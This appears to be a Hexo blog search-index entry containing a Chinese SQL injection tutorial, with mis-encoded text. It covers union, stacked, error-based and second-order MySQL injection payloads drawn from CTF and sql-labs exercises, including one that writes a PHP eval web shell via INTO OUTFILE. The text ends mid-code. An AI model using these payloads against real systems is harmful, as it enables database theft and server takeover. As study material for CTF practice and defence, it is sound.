<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>é€šè¿‡mysqlå­¦ä¹ sqlæ³¨å…¥</title>
      <link href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>æœåŠ¡å™¨å°†<strong>ç”¨æˆ·æäº¤çš„å‚æ•°</strong>é”™è¯¯åœ°<strong>æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</strong>ï¼Œ<strong>æ‰“ç ´äº†æ•°æ®åŒºåŸŸçš„è¾¹ç•Œï¼ˆæ•°å­—å‹ä¸éœ€è¦ï¼‰æ”¹å˜äº†åŸæœ‰çš„sqlæ‰§è¡Œé€»è¾‘</strong>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæ¶æ„çš„sqlè¯­å¥ã€‚</p><p>ç®€å•çš„ä¾‹å­</p><p>å‡è®¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·æäº¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åçš„sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>è¦è¿›è¡Œæ³¨å…¥ï¼Œåªéœ€è¦å°†<code>and 1=1</code>éƒ¨åˆ†æ›¿æ¢ä¸ºå…¶ä»–sqlè¯­å¥å³å¯ã€‚</p><blockquote><p>å…¶å®åˆ†æ<code>sqlmap</code>çš„æ³¨å…¥ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ³¨å…¥è¯­å¥ç”±<code>prefix</code>ï¼Œ<code>payload</code>å’Œ<code>suffix</code>ç»„æˆ</p></blockquote><p>å›¾æ¥æº<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h2><ul><li><p>æ‹¿åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ‰‹æœºå·ï¼Œèº«ä»½è¯ï¼Œé‚®ç®±ï¼Œå®¶åº­åœ°å€ç­‰</p></li><li><p>åå°è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‡èƒ½å¯†ç ï¼Ÿè¿™å¹´å¤´è¿˜æœ‰å—ğŸ¤”</span><br><span class="line">æ‹¿åˆ°å¯†ç ï¼Œä½†æ˜¯ä¸€èˆ¬å¯†ç éƒ½æ˜¯åŠ ç›å†åŠ å¯†çš„äº†å§ï¼Œéœ€è¦å½©è™¹è¡¨å•¥çš„ã€‚</span><br><span class="line">æˆ–è€…å †å æ³¨å…¥åˆ›å»ºä¸€ä¸ªï¼Œä¿®æ”¹ä¸€ä¸ªç­‰                       </span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä»»æ„è¯»å–</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>ææƒ</p></li></ul><h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="ç«™åº“åˆ†ç¦»"><a href="#ç«™åº“åˆ†ç¦»" class="headerlink" title="ç«™åº“åˆ†ç¦»"></a>ç«™åº“åˆ†ç¦»</h4><h5 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h5><p>ç«™åº“åˆ†ç¦»ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ•°æ®åº“è¿›è¡Œè¯»å†™</p><h5 id="åˆ¤æ–­æ–¹æ³•"><a href="#åˆ¤æ–­æ–¹æ³•" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h5><ul><li><p>é€šç”¨æ–¹æ³•</p><p>è¯»å–é…ç½®æ–‡ä»¶ï¼Œåˆ¤æ–­IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //æœåŠ¡ç«¯ä¸»æœºåç§° select * from information_schema.PROCESSLIST; //å®¢æˆ·ç«¯ä¸»æœºåç§°å’Œç«¯å£</span><br></pre></td></tr></table></figure><blockquote><p>Windowsè¿æ¥æ ¼å¼ï¼šä¸»æœºå:Port</p><p>Linuxè¿æ¥æ ¼å¼ï¼šIP:Port</p><p>æœ¬åœ°è¿æ¥æ ¼å¼ï¼šlocalhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user()ï¼›</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸æ˜¯localhostï¼Œå¤§æ¦‚ç‡æ˜¯ç«™åº“åˆ†ç¦»ã€‚</p></blockquote><p><img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h4 id="æ•°æ®åº“ç±»å‹"><a href="#æ•°æ®åº“ç±»å‹" class="headerlink" title="æ•°æ®åº“ç±»å‹"></a>æ•°æ®åº“ç±»å‹</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="å„ç§ä¿¡æ¯"><a href="#å„ç§ä¿¡æ¯" class="headerlink" title="å„ç§ä¿¡æ¯"></a>å„ç§ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_privä¸ºç©ºæ—¶è¿”å›0,ä¸ä¸ºç©ºæ—¶è¿”å›å…¶å€¼</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç»“æœ</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3ï¼Œdebian-linux-gnuï¼Œx86_64ï¼ŒDebian buildd-unstable</span><br><span class="line">kaliï¼Œ3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/ï¼Œ/usr/lib/mysql/plugin/ï¼Œ/tmpï¼Œ/usr</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h3><h4 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h4><p>ä¸€åˆ‡ä¸æ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹ï¼Œå–å†³äºåç«¯ä»HTTPè¯·æ±‚æŠ¥æ–‡ä¸­æå–äº†ä»€ä¹ˆæ•°æ®å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ã€‚</p><h4 id="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"><a href="#æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥" class="headerlink" title="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"></a>æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</h4><ul><li><p>å­—ç¬¦å‹oræ•°å­—å‹ï¼šfuzzé—­åˆç±»å‹</p></li><li><p>æ˜¯å¦æœ‰æŠ¥é”™ï¼Œæ˜¯å¦èƒ½é€ƒé€¸æ‰§è¡Œsqlè¯­å¥ï¼ˆé€»è¾‘ï¼Œå»¶æ—¶ç­‰åˆ¤æ–­ï¼‰</p></li></ul><h4 id="åç«¯è¯­å¥"><a href="#åç«¯è¯­å¥" class="headerlink" title="åç«¯è¯­å¥"></a>åç«¯è¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¾—åˆ°åç«¯æ‰§è¡Œçš„sqlè¯­å¥</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysqlæ³¨å…¥æ‰‹æ®µ"><a href="#Mysqlæ³¨å…¥æ‰‹æ®µ" class="headerlink" title="Mysqlæ³¨å…¥æ‰‹æ®µ"></a>Mysqlæ³¨å…¥æ‰‹æ®µ</h3><h4 id="adminç™»å…¥"><a href="#adminç™»å…¥" class="headerlink" title="adminç™»å…¥"></a>adminç™»å…¥</h4><ul><li><p>ä¸‡èƒ½å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¸ƒå°”è¿ç®—è®©whereæ’ä¸ºçœŸ</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>æ³¨å†Œè¦†ç›–</p><blockquote><p>admin (æœ‰ä¸ªç©ºæ ¼)æˆ–è€… (æœ‰ä¸ªç©ºæ ¼)admin</p><p>åŸç†ï¼šç”¨æˆ·åå­—æ®µé•¿åº¦&gt;5ï¼Œæ‰€ä»¥å¯ä»¥æ·»åŠ ç©ºæ ¼ï¼Œè€Œsqlè¯­å¥æ‰§è¡Œæ—¶ä¼šå°†ç©ºæ ¼å¿½ç•¥ã€‚</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>sqlè¯­å¥ä¸º<code>select</code>,é¡µé¢æœ‰å›æ˜¾æŸ¥è¯¢ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>å…ˆé€šè¿‡order byç­‰è¯­å¥åˆ¤æ–­åˆ—æ•°ï¼Œå†åˆ¤æ–­å“ªä¸€åˆ—æ˜¯è¾“å‡ºç‚¹ï¼Œæœ€åè¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–åº“å</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–è¡¨å </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;å·²çŸ¥è¡¨å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå€¼</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(å­—æ®µ1ï¼Œå­—æ®µ2...) from å·²çŸ¥è¡¨å#</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š</p><p>å› ä¸ºåç«¯æŸ¥è¯¢è¯­å¥å¯èƒ½åªæ‹¿ç¬¬ä¸€è¡ŒæŸ¥è¯¢ç»“æœå¦‚<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å¦‚-1ï¼Œä½¿å¾—è”åˆæŸ¥è¯¢çš„ç»“æœæˆä¸ºç¬¬ä¸€è¡Œï¼›</p><p>è¦æŸ¥çš„è¡¨çš„åç§°(è¿™ä¸ªè¡¨æ˜¯ä¸æ˜¯åœ¨ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰çš„è¯è¡¨å&#x3D;æ•°æ®åº“.è¡¨å)</p></blockquote><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><blockquote><p>åç«¯ä½¿ç”¨çš„æŸ¥è¯¢å‡½æ•°ä¸º<code>mysqli_multi_query()</code> ï¼Œæ”¯æŒå¤šæ¡è¯­å¥æŸ¥è¯¢</p><p>è€Œä¸æ˜¯<code>mysqli_query()</code> ï¼Œä»…æ”¯æŒä¸€æ¡è¯­å¥æŸ¥è¯¢</p></blockquote><h5 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h5><ul><li><p>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“çš„å½±å“</p></li><li><p>æ— å›æ˜¾ï¼šåœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥</p><p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢æŸ¥å‡ºæ¥</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sqlè¯­å¥;--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»»æ„æ‰§è¡Œsqlè¯­å¥ï¼Œå±å®³å¾ˆå¤§</p><h6 id="é…åˆhandleç»•è¿‡å…³é”®å­—"><a href="#é…åˆhandleç»•è¿‡å…³é”®å­—" class="headerlink" title="é…åˆhandleç»•è¿‡å…³é”®å­—"></a>é…åˆhandleç»•è¿‡å…³é”®å­—</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler è¡¨å  open ; handler è¡¨å read first; #æ‰“å¼€è¡¨ï¼›è¯»å–ç¬¬ä¸€æ¡æ•°æ®</span><br><span class="line">handler è¡¨å read next;#ä¸ä¸Šä¸€æ¡è¯­å¥ä¸€èµ·ç”¨ï¼Œè¯»å–ä¸‹ä¸€æ¡å³ç¬¬äºŒæ¡æ•°æ®</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜</a></p><h6 id="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"><a href="#é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡" class="headerlink" title="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"></a>é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡</h6><p>ä½¿ç”¨æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //å­˜å‚¨è¡¨å</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //å­˜å‚¨SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //é¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">execute query;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>è½¬æ¢è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><h5 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><strong>ä½¿ç”¨<code>mysql_error()</code>å‡½æ•°ï¼Œå¯ä»¥è¿”å›ä¸Šä¸€ä¸ªMysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h5><p>æœ€å¸¸ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpatè¯­æ³•é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶32ä½,é…åˆsubstr()ç­‰æˆªå–å­—ç¬¦ä¸²å‡½æ•°ä½¿ç”¨</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>å…¶ä»–<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQLæŠ¥é”™æ³¨å…¥ </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå‹ï¼š</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">çˆ†åº“:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;å·²çŸ¥åº“å&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†åˆ—åï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µå€¼</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥</h4><h5 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>å¸¸è§è½¬ä¹‰å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>ä»¥<code>sql-labs Less-24</code>ä¸ºä¾‹</p><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸æ°å½“çš„å‡½æ•°<code>mysql_escape_string</code>ï¼ŒåŠŸèƒ½ä¸ºåœ¨ MySQL ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’Œç©ºå­—èŠ‚ï¼‰å‰æ·»åŠ åæ–œæ å­—ç¬¦ã€‚æ‰€ä»¥è„æ•°æ®è¿˜æ˜¯è¿›å…¥åˆ°äº†æ•°æ®åº“ä¸­ã€‚</p><p>ä¿®æ”¹å¯†ç å¤„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; 